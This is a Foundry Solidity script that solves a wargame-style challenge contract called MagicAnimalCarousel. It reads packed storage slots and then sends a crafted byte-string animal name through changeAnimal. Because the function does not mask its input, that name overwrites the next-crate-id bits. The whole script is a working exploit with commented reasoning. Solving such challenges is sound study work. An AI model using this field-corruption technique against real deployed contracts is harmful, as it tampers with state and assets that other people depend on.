// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.28;

import {Script, console} from "forge-std/Script.sol";
import {MagicAnimalCarousel} from "src/33.MagicAnimalCarousel.sol";

contract MagicAnimalCarouselScript is Script {
    function setUp() public {}

    function run() public {
        vm.startBroadcast();

        address instanceAddr = 0x850610688C3CBFA178C9dBd2949322C97fa65B9e;

        MagicAnimalCarousel carousel = MagicAnimalCarousel(instanceAddr);

        uint256 currentCrateId = carousel.currentCrateId();
        console.log("Current Crate Id:", currentCrateId); // should be 0

        uint256 carouselZero = carousel.carousel(0);
        console.log("Carousel Zero:", carouselZero); // should be 1^160

        uint256 nextCrateId = (carouselZero & (uint256(type(uint16).max) << 160)) >> 160;
        console.log("Next Crate Id:", nextCrateId); // should be 1

        carousel.setAnimalAndSpin("Dogo");

        // next crate id is not increasing in consecutive manner
        // as it calculated using bitwise operation
        // (((nextCrateId + 1) % MAX_CAPACITY) << 160)
        // so manipulating the next crate id is possible
        // if nextCrateId in setAnimalAndSpin is MAX_CAPACITY,
        // then after setAnimalAndSpin, nextCrateId will be 1

        // manipulating the next crate id, how?
        console.log("New Current Crate Id:", carousel.currentCrateId()); // should be 1
        uint256 carouselOne = carousel.carousel(1);
        console.log("Carousel One:", carouselOne);

        uint256 newNextCrateId = (carouselOne & (uint256(type(uint16).max) << 160)) >> 160;
        console.log("New Next Crate Id:", newNextCrateId); // should be 2

        // changeAnimal doesn't right shift encodedAnimal by 16 bits
        // and use just or operation rather than including xor operation
        // thus, we can manipulate the next crate id
        // by using last 16 bits of encodedAnimal to be MAX_CAPACITY (0xffff)

        // console.logBytes32(
        //     bytes32(uint256(((uint256(type(uint16).max) + 1) % 0xffff) << 160))
        // );

        // there is animal name length limit...
        // should larger than or equal to 1 << 160
        // as right shift 160 will be 0 if smaller than 1 << 160
        string memory newAnimal = string(abi.encodePacked(hex"10000000000000000000ffff"));

        carousel.changeAnimal(newAnimal, 1);

        uint256 newCarouselOne = carousel.carousel(1);
        console.log("New Carousel One:", newCarouselOne);

        uint256 brandNewNextCrateId = (newCarouselOne & (uint256(type(uint16).max) << 160)) >> 160;
        console.log("Brand New Next Crate Id:", brandNewNextCrateId); // should be 0xffff not 2

        carousel.setAnimalAndSpin("Pingu");

        uint256 newCurrentCrateId = carousel.currentCrateId();
        console.log("New Current Crate Id:", newCurrentCrateId); // should be 0xffff
        console.log("New Carousel 0xffff:", carousel.carousel(newCurrentCrateId)); // should have value

        // next crate id will be 1

        vm.stopBroadcast();
    }
}
